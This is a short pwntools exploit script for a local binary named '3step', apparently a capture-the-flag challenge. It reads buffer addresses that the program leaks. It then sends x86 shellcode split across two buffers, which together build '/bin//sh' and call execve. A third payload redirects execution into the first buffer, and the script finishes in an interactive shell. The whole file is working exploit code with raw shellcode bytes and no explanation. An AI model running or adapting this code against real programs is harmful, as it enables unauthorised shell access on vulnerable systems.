from pwn import *

app = process('./3step')
app.recvline()
app.recvline()

# len: 18
first_buffer_address = int(app.recvline()[2:-1], 16)

# len: 16
second_buffer_address = int(app.recvline()[2:-1], 16)

jmp_to_buffer = "\xbb" + p32(second_buffer_address) + "\xff\xd3"
second_payload = "\x90\xbf\x2f\x62" + "\x69\x6e\x51\x56" + "\x57\x8d\x1c\x24" + "\xb0\x0b\xcd\x80"
first_payload = "\x90\x99\xf7\xe2\x8d\x08\xbe\x2f\x2f\x73\x68" + jmp_to_buffer
third_payload = p32(first_buffer_address)

app.sendafter(": ", first_payload)
app.sendafter(": ", second_payload)
app.sendafter(": ", third_payload)

app.interactive()
